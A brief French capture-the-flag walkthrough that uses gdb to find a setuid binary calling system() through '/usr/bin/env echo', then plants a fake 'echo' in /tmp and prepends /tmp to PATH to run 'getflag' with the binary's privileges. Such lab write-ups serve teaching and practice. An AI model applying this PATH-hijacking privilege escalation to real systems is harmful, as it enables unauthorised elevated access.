Il y a un seteuid sur le binaire level03
```bash
gdb level03
```
Je désassemble le main

`disassemble main`

Je place un BP sur l'address
`b *address`

Je tcheck l'address
`x/w $esp`

`x/s address`

Et j'obtient l'execution de system
"/usr/bin/env echo Exploit me"

Je crée le binaire /tmp/echo
```bash
echo "getflag" > /tmp/echo
```

Et je change le PATH d'environnement

```bash
export PATH=/tmp:$PATH
```

Esuite j'execute le binaire level03